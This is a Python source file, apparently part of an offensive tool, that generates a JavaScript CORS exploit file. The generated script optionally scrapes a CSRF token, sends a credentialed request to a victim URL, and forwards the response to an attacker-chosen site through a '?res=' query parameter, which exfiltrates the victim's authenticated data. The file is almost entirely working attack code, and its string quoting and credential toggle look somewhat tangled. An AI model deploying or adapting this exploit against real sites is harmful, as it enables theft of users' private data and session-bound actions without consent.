import re,requests

class writejs():
    def __init__(self, args,arg):
            self.arg = arg
            self.args = args
            self.callcsrf = ''
            if self.args.auth.lower() != 'y':
                self.cookie = '.withCredentials = true;'
            else:
                self.cookie = '.withCredentials = false;'
            if self.args.csrf.lower() == 'y':
                self.domain = input("Please Enter Main URL: ")
                def csrf(dom):
                    req = requests.get(dom)
                    try:
                        token = re.search("name=.*(srf).*",req.text)[0]
                    except:
                        print("No Access To The CSRF Token")
                        exit()
                    token2 = re.search('\s(\w+)',token)[1]
                    token1 = re.search('name="(.*)"\s',token,re.DOTALL)[1].strip()
                    return token1,token2
                self.content1,self.content2 = csrf(self.domain)  
                self.callcsrf= f"token('{self.domain}' , '{self.content1}', '{self.content2}')"
            with open ('CORS_Javascript/cors.js','w') as f:
                f.write('''
        function token(site,reg1 ,reg2){
            var xhr_csrf = new XMLHttpRequest();
            xhr_csrf.onreadystatechange = function() { 
                if(xhr_csrf.readyState === XMLHttpRequest.DONE) {
                    var dom = xhr_csrf.responseText;
                    var parser = new DOMParser().parseFromString(dom,"text/html");
                    csrf = parser.getElementsByName(reg1)[0].getAttribute(reg2);
            }
        }
            xhr_csrf.open('GET', site , false);'''f'''
            xhr_csrf{self.cookie}''''''
            xhr_csrf.send();
        }
            function sendback(site,response){
                var xhr_back = new XMLHttpRequest();
                xhr_back.open('GET', site+'/?res='+response , true);
                xhr_back.send();
            } 
            function sendreq(method, site, victim, args,head){
                var xhr = new XMLHttpRequest();
                xhr.onreadystatechange = function() {
                if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                    sendback(site,xhr.responseText);
                    }
                }
                xhr.open(method, victim, true);
                xhr.setRequestHeader('Content-Type', head)
            '''f''' xhr{self.cookie}''''''
                xhr.send(args);
            }'''f'''
            if ('{self.args.method.upper()}' !== 'GET')'''"{"f'''
                {self.callcsrf}
                head = '{self.args.content}'
                sendreq('{self.args.method.upper()}', '{self.args.site}','{self.args.victim}',`{self.arg}` ,head)
            ''''''}
            else{'''f'''
                head = 'text/plain'
                sendreq('{self.args.method.upper()}', '{self.args.site}','{self.args.victim}','',head)
            ''''}')
            